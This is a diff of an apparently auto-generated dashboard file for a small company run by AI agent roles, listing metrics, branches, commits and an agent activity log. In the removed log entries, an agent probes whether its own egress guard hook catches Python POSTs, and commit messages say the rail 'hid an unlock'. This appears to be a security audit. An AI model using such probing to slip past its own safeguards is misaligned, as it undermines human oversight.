@@ -1,6 +1,6 @@
 {
-  "generated_at": "2026-09-01T15:30:27Z",
-  "prod_included": true,
+  "generated_at": "2026-09-01T16:06:05Z",
+  "prod_included": false,
   "founder_inbox": {
     "open": [
       "**A9 — the `gsc` MCP server has been misconfigured since setup and no `mcp__gsc__*` tool call",
@@ -59,30 +59,34 @@
   },
   "company": {
     "mrr": {
-      "value": 0.0,
-      "currency": "EUR",
-      "n": 1,
-      "source": "stripe live /v1/subscriptions"
+      "value": null,
+      "unknown": true,
+      "why": "no Stripe read",
+      "fix": "run with --prod"
     },
     "customers": {
-      "value": 1
+      "value": null,
+      "unknown": true,
+      "why": "no Stripe read",
+      "fix": "run with --prod"
     },
     "north_star_weekly_trusted_checks": {
-      "value": 1,
-      "n": 2,
-      "source": "sql/metrics/weekly_trusted_checks.sql (production)"
+      "value": null,
+      "unknown": true,
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     },
     "retention_30d": {
       "value": null,
       "unknown": true,
-      "why": "population below floor (n = 0, floor = 100)",
-      "fix": null
+      "why": "population below floor (n = 4, floor = 100)",
+      "fix": "not enough evidence to publish this; the .sql header says why"
     },
     "trial_to_paid": {
       "value": null,
       "unknown": true,
-      "why": "population below floor (n = 1, floor = 100)",
-      "fix": null
+      "why": "population below floor (n = 10, floor = 100)",
+      "fix": "not enough evidence to publish this; the .sql header says why"
     },
     "spend_vs_cap": {
       "value": null,
@@ -90,16 +94,7 @@
       "why": "no spend ledger yet",
       "fix": "Phase 2: finance-ops writes docs/company/LEDGER.md"
     },
-    "spend_cap_eur": 200,
-    "users_total": {
-      "value": 6
-    },
-    "users_paying": {
-      "value": 0
-    },
-    "charges_paid": {
-      "value": 0
-    }
+    "spend_cap_eur": 200
   },
   "quality": {
     "canary": {
@@ -117,57 +112,45 @@
     "band_coverage_demand": {
       "value": null,
       "unknown": true,
-      "why": "population below floor (n = 70, floor = 100)",
-      "fix": null
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     },
     "band_evidence_p50": {
-      "value": 14.0,
-      "n": 63,
-      "source": "sql/metrics/band_evidence_p50.sql (production)"
+      "value": null,
+      "unknown": true,
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     },
     "insufficient_data_rate": {
       "value": null,
       "unknown": true,
-      "why": "population below floor (n = 70, floor = 100)",
-      "fix": null
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     },
     "band_coverage_supply": {
-      "value": 63.0,
-      "n": 100,
-      "source": "sql/metrics/band_coverage_supply.sql (production)"
+      "value": null,
+      "unknown": true,
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     },
     "n_predictions_resolved": {
       "value": 0,
-      "n": 356,
-      "source": "sql/metrics/n_predictions_resolved.sql (production)"
+      "n": 38,
+      "source": "sql/metrics/n_predictions_resolved.sql"
     },
     "pipeline_lag_min": {
-      "value": 22.1,
-      "n": 1271,
-      "source": "sql/metrics/pipeline_lag_min.sql (production)"
-    },
-    "listings_total": {
-      "value": 13042858
-    },
-    "newest_sold_at": {
-      "value": "2026-09-01 15:24:10"
-    },
-    "predictions_total": {
-      "value": 356
+      "value": null,
+      "unknown": true,
+      "why": "inspected nothing (n = 0)",
+      "fix": "no rows in the measurement window yet"
     }
   },
   "funnel": {
-    "verdicts_7d": {
-      "value": 106
-    },
-    "pageviews_7d": {
-      "value": 1279
-    },
-    "signups_7d": {
-      "value": 3
-    },
-    "attributed_signups": {
-      "value": 0
+    "note": {
+      "value": null,
+      "unknown": true,
+      "why": "no funnel events table wired yet",
+      "fix": "run with --prod"
     }
   },
   "departments": {
@@ -182,6 +165,7 @@
         "counter": "test_coverage_touched_files >= 80%",
         "branches": [
           "w1-close-workboard  (merged)",
+          "demand-intel:a24-market-avg-gate",
           "demand-intel:anon-quota-cookie  (merged)",
           "demand-intel:e1-portfolio-paywall  (merged)",
           "demand-intel:fx-currency-v2",
@@ -351,6 +335,7 @@
           "i18n-de-it-pt  (merged)",
           "truth-pass-and-cut-business  (merged)",
           "w19-i18n-auth-surfaces  (merged)",
+          "w45-w48-verify",
           "w9-i18n-surfaces  (merged)"
         ],
         "events": null,
@@ -659,6 +644,7 @@
       "+ claude/frontend-eng/i18n-de-it-pt",
       "claude/frontend-eng/truth-pass-and-cut-business",
       "+ claude/frontend-eng/w19-i18n-auth-surfaces",
+      "claude/frontend-eng/w45-w48-verify",
       "+ claude/frontend-eng/w9-i18n-surfaces",
       "+ claude/product-manager/w10-w5-pricing-decisions",
       "claude/security-eng/hardening-20",
@@ -667,6 +653,22 @@
       "+ claude/seo/w2-zero-model-cleanup"
     ],
     "recent_commits": [
+      {
+        "sha": "7670514",
+        "msg": "board: 27 \"pending\" rows were really 4 -- all three causes fixed"
+      },
+      {
+        "sha": "f96f1e3",
+        "msg": "diagnose: of 27 \"pending\" rows, about 7 are actually pending"
+      },
+      {
+        "sha": "8cbe95b",
+        "msg": "security: the egress rail now lists what we actually use, and it hid an unlock"
+      },
+      {
+        "sha": "4637657",
+        "msg": "security: repos are clean, and the egress rail is not what it claims"
+      },
       {
         "sha": "a271832",
         "msg": "session: the free tool's only CTA was selling a 49 EUR plan"
@@ -698,22 +700,6 @@
       {
         "sha": "ac4d771",
         "msg": "session: a measured number killed an assumption, and found a 3x undersell"
-      },
-      {
-        "sha": "28d19ae",
-        "msg": "seo: kill the 36 zero-model /flip URLs (this week's goal)"
-      },
-      {
-        "sha": "fbaa3d1",
-        "msg": "session: agents made a decision without me, and a real leak came out of it"
-      },
-      {
-        "sha": "74c1d4f",
-        "msg": "merge: two decisions that had been sitting unmade, and a real leak found (A23, A24)"
-      },
-      {
-        "sha": "2d6d3d7",
-        "msg": "bus: agents consulting each other directly for the first time"
       }
     ],
     "dirty": true,
@@ -783,300 +769,480 @@
   ],
   "activity": [
     {
-      "ts": "2026-09-01T15:30:44Z",
+      "ts": "2026-09-01T16:05:47Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "python3 /private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/secsweep.py 2>&1 | tail -28",
+      "cmd": "sed -n '324,344p' scripts/company/build_dashboard.py",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:30:26Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Write",
-      "files": [
-        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/secsweep.py"
-      ],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:29:37Z",
+      "ts": "2026-09-01T16:05:43Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "grep -n \"POST_HOSTS_OK\" -A 8 .claude/hooks/guard.py | head -14; echo \"=== does the rule catch python/urllib POSTs too? ===\"; grep -n \"curl\\|requests\\|urllib\" .claude/hooks/guard.py | sed -n '1,6p'",
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -c \"import main\" && python3 -m pytest tests/test_ext_error_rou",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:29:32Z",
+      "ts": "2026-09-01T16:05:40Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "grep -n \"allowlist\\|ALLOW_HOSTS\\|non-allowlisted\" .claude/hooks/guard.py | head -6; echo \"--- the rule:\"; grep -n \"POST/PUT/DELETE\" -B 12 .claude/hooks/guard.py | grep -E \"HOST|allow|resaleiq|localhos",
+      "cmd": "grep -n \"ACTIVITY\\|activity\" scripts/company/build_dashboard.py | head -6",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:29:01Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "bash .claude/bin/with-secrets.sh sh -c 'curl -s -m 20 -H \"xi-api-key: $ELEVENLABS_API_KEY\" https://api.elevenlabs.io/v1/user | head -c 400; echo; echo \"--- with Authorization header instead:\"; curl -s",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:28:49Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "bash .claude/bin/with-secrets.sh sh -c 'printf \"key length: \"; printf \"%s\" \"$ELEVENLABS_API_KEY\" | wc -c; case \"$ELEVENLABS_API_KEY\" in sk_*) echo \"prefix: sk_\";; xi-*) echo \"prefix: xi-\";; *) echo \"p",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:28:28Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "cd /Users/bilalsbaiby/work/resale-iq && bash .claude/bin/with-secrets.sh sh -c '\nprintf \"ElevenLabs: \"\ncurl -s -o /dev/null -m 20 -w \"%{http_code}\\n\" -H \"xi-api-key: $ELEVENLABS_API_KEY\" https://api.e",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:23:49Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "SB=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad && cat > \"$SB/ms10.txt\" <<'MSG'\nsession: the free tool's only CTA was selling a 49 EUR plan\n\nux-resea",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:23:31Z",
+      "ts": "2026-09-01T16:05:36Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Edit",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/SESSION.md"
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/routes.py"
       ],
       "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:23:17Z",
+      "ts": "2026-09-01T16:05:32Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "git status --porcelain | head -5",
+      "tool": "Edit",
+      "files": [
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/routes.py"
+      ],
+      "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:22:56Z",
+      "ts": "2026-09-01T16:05:29Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "SB=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad && cat > \"$SB/mreg.txt\" <<'MSG'\nfix: the free tool's CTA was landing people on a 49 EUR/month form\n\nT",
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ngrep -n \"^from typing import Optional\" \"$SP/wt-backend-a24-w42/api/routes.py\"\ngrep -n \"from typing im",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:22:32Z",
+      "ts": "2026-09-01T16:05:28Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "npm run build >/dev/null 2>&1 && echo \"BUILD OK\"; npm run test:e2e:required 2>&1|tail -3",
+      "cmd": "grep -n \"cmd\\|activity\" scripts/company/build_dashboard.py | grep -iE \"cmd|command\" | head -6",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:21:26Z",
+      "ts": "2026-09-01T16:05:17Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "python3 - <<'PY'\nimport io\np=\"src/components/tools/free-checker.tsx\"; s=io.open(p,encoding=\"utf-8\").read()\nold = '<SmartCTA anonLabel={t.unlockRest} authedLabel={t.seeFullNumbers} authedHref=\"/verdict",
+      "cmd": "grep -n \"<CREDENTIAL>\\|credential\" scripts/check-agent-isolation.mjs | head -8; echo \"--- what data.json actually contains:\"; python3 -c \"\nimport json,re\nd=json.load(open('dashboard/data.json'))\ns=js",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:20:59Z",
+      "ts": "2026-09-01T16:05:16Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "cd /Users/bilalsbaiby/work/resale-iq && sed -n '385,391p' src/components/tools/free-checker.tsx; echo \"=== smart-cta ===\"; find src -name \"smart-cta.tsx\" -exec sed -n '14,24p' {} \\; ; echo \"=== regist",
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && git remote -v && git log --oneline -4 && echo --- && git diff --stat m",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:20:11Z",
+      "ts": "2026-09-01T16:05:10Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq && gh run list --limit 5 2>&1 | head -6; echo \"=== why Agent Isolation fails ===\"; node scripts/check-agent-isolation.mjs 2>&1 | tail -8",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:05:02Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "find /Users/bilalsbaiby/work/resale-iq/docs/company -iname \"*WORKBOARD*\" -o -iname \"*SESSION*\" 2>/dev/null",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:57Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && git commit -m \"$(cat <<'EOF'\nfeat(W42): build POST /api/ext/error (APP",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:46Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && git add -A -- api/auth.py api/routes.py db/schema.py main.py tests/tes",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:35Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "diff /tmp/main_tests.txt /tmp/wt_tests.txt | head -60",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:29Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -m pytest --collect-only -q 2>&1 | grep \"::test_\" | sort > /tm",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:28Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "gh run view 33529515716 --log-failed 2>&1 | tail -60",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:21Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\nsleep 5\ngh pr checks 2 2>&1 | head -20",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:16Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && git status --short",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:12Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd /Users/bilalsbaiby/work/demand-intel && python3 -m pytest --collect-only -q 2>&1 | tail -3",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:05Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -m pytest --collect-only -q tests/test_market_avg_price_gate.p",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:04:01Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -m pytest --collect-only -q 2>&1 | tail -3",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:56Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cat /Users/bilalsbaiby/work/resale-iq/docs/company/SESSION.md 2>&1 | head -40",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:55Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -m pytest -q 2>&1 | tail -20",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:54Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\npython3 scripts/company/bus.py send --from frontend-eng --to devops --subject \"Deploy has been silently skipping since 14:38 UTC -- W53, 9 commits stuck on main\" -",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:45Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\npython3 scripts/company/bus.py send --from frontend-eng --to ceo --subject \"W47 fix is NOT live -- deploy stuck since 14:38 UTC, 9 commits unshipped (W53)\" --body ",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:30Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngit log -1 --oneline\ngit status\ngit diff --stat",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:23Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngit checkout main 2>&1\ngit status",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:20Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngh pr create --title \"W45/W47/W48: live-verify the register-form fix, find it never deployed (W53)\" --body \"$(cat <<'EOF'\n## Summary\n- **W45/W47**: verified live a",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:03:04Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngit push -u origin claude/frontend-eng/w45-w48-verify 2>&1",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:44Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngit commit -m \"$(cat <<'EOF'\nboard: W47's fix is not live -- deploy has been stuck since 14:38 UTC (W53); W48 mobile retested clean\n\nVerified W45/W47 live against ",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:32Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cd /Users/bilalsbaiby/work/resale-iq\ngit status\ngit add docs/company/WORKBOARD.md docs/audit/proof/W45 docs/audit/proof/W48\ngit status",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:27Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "cp /private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt/resale-iq-w48/mobile-retest.mjs /Users/bilalsbaiby/work/resale-iq/docs/audit/proof/W48/mobile-rete",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:27Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -m pytest tests/test_ext_error_route.py -q 2>&1 | tail -100",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:19Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ngrep -n \"^async def _fetchone\\|^def _fetchone\" \"$SP/wt-backend-a24-w42/db/queries.py\"",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:02:15Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Write",
+      "files": [
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/tests/test_ext_error_route.py"
+      ],
+      "cmd": "",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:01:40Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Edit",
+      "files": [
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt/resale-iq-w48/mobile-retest.mjs"
+      ],
+      "cmd": "",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:01:37Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Bash",
+      "files": [],
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ncd \"$SP/wt-backend-a24-w42\" && python3 -c \"import main\" 2>&1 | tail -40",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:01:29Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Read",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md"
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt/resale-iq-w48/mobile-retest.mjs"
       ],
       "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:20:03Z",
+      "ts": "2026-09-01T16:01:23Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "git status --short && echo \"---diff stat---\" && git diff --stat",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:44Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "tail -60 /Users/bilalsbaiby/work/resale-iq/docs/company/SESSION.md 2>&1; echo \"---wc---\"; wc -l /Users/bilalsbaiby/work/resale-iq/docs/company/SESSION.md",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:34Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 scripts/company/bus.py send \\\n  --from ux-researcher --to frontend-eng --kind finding \\\n  --subject \"Live funnel walk done: W47 (default-Pro signup) is the real doer row, W48 mobile is unconfi",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:19Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 scripts/company/bus.py send --help 2>&1 | head -30",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:15Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 scripts/company/bus.py inbox ux-researcher 2>&1 | tail -30",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:12Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
+      "tool": "Write",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md"
+        "/Users/bilalsbaiby/work/resale-iq/docs/audit/proof/W48/proof.sh"
       ],
       "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:19:09Z",
+      "ts": "2026-09-01T16:01:15Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 << 'PYEOF'\npath = \"docs/company/ACTIVATION.md\"\nwith open(path, \"r\", encoding=\"utf-8\") as f:\n    content = f.read()\n\nold = \"\"\"Written by `customer-success`, 2026-09-01, the first session this r",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:19:02Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 << 'PYEOF'\npath = \"docs/company/ACTIVATION.md\"\nwith open(path, \"r\", encoding=\"utf-8\") as f:\n    content = f.read()\n\nold_tail = \"\"\"`resale-iq/src/lib/i18n.ts`, `resale-iq/src/app/[locale]/page.",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:18:54Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
+      "tool": "Edit",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md"
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/main.py"
       ],
       "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:51Z",
+      "ts": "2026-09-01T16:01:04Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"^##\" /Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md",
+      "tool": "Write",
+      "files": [
+        "/Users/bilalsbaiby/work/resale-iq/docs/audit/proof/W45/proof.sh"
+      ],
+      "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:45Z",
+      "ts": "2026-09-01T16:01:04Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 << 'PYEOF'\npath = \"docs/company/ACTIVATION.md\"\nwith open(path, \"r\", encoding=\"utf-8\") as f:\n    content = f.read()\n\nsection = r\"\"\"\n## 6. The live walk — done 2026-09-01, replaces §0's blocker\n",
+      "tool": "Edit",
+      "files": [
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/routes.py"
+      ],
+      "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:12Z",
+      "ts": "2026-09-01T16:00:52Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"",
+      "cmd": "mkdir -p /Users/bilalsbaiby/work/resale-iq/docs/audit/proof/W45 /Users/bilalsbaiby/work/resale-iq/docs/audit/proof/W48\nSP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:09Z",
